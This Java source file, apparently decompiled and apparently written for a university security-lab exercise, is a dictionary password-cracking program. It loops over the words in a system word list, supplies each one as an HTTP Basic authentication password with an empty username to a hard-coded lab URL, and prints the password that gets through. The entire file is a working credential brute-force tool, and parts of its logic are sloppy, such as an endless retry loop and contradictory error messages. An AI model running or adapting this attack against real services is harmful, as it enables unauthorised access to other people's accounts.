public class Dictionary {
    static java.io.BufferedReader f00;
    static MyAuthenticator f10;
    public Dictionary() {
        super();
    }
    public static void main ( String[] a ) {
        java.net.Authenticator.setDefault ( ( java.net.Authenticator ) f10 );
        try {
            java.net.URL a0 = new java.net.URL ( "http://sec-crack.cs.rmit.edu./SEC/2/index.php" );
            boolean b = false;
            while ( !b ) {
                try {
                    f00 = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.InputStreamReader ( a0.openStream() ) );
                    b = true;
                } catch ( java.io.IOException ignoredException ) {
                }
            }
            while ( f00.readLine() != null ) {
            }
            java.io.PrintStream a1 = System.out;
            StringBuilder a2 = new StringBuilder().append ( "The successful Password found using a Dictionary search is = " );
            MyAuthenticator dummy = f10;
            a1.println ( a2.append ( MyAuthenticator.m10() ).toString() );
        } catch ( java.net.MalformedURLException ignoredException0 ) {
            System.out.println ( "mfURL" );
        }
    }
    static {
        f00 = null;
        f10 = new MyAuthenticator();
    }
}
class MyAuthenticator extends java.net.Authenticator {
    String f00;
    static String f10;
    static String f20;
    static java.io.BufferedReader f30;
    public MyAuthenticator() {
        super();
        this.f00 = "";
        label0: {
            label1: try {
                java.io.BufferedReader a = null;
                try {
                    a = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.FileReader ( f20 ) );
                } catch ( java.io.FileNotFoundException ignoredException ) {
                    break label1;
                }
                f30 = a;
                break label0;
            } catch ( java.io.IOException ignoredException0 ) {
                System.out.println ( "File  Failed.." );
                System.exit ( 1 );
                break label0;
            }
            System.out.println ( new StringBuilder().append ( "File " ).append ( f20 ).append ( " Not Found" ).toString() );
            System.out.println ( " File Opened" );
            System.exit ( 1 );
        }
    }
    static void m00 ( String s ) {
        f10 = s;
    }
    static String m10() {
        return f10;
    }
    static String m20() {
        try {
            String s = f30.readLine();
            f10 = s;
            if ( s == null ) {
                System.out.println ( new StringBuilder().append ( "Password Not found in file '" ).append ( f20 ).append ( "'." ).toString() );
                System.exit ( 1 );
            }
        } catch ( java.io.IOException a ) {
            System.out.println ( "File IOException" );
            System.out.println ( ( Object ) a );
        }
        return f10;
    }
    protected java.net.PasswordAuthentication getPasswordAuthentication() {
        return new java.net.PasswordAuthentication ( this.f00, MyAuthenticator.m20().toCharArray() );
    }
    static {
        f10 = "";
        f20 = "/usr/share/lib/dict/words";
    }
}
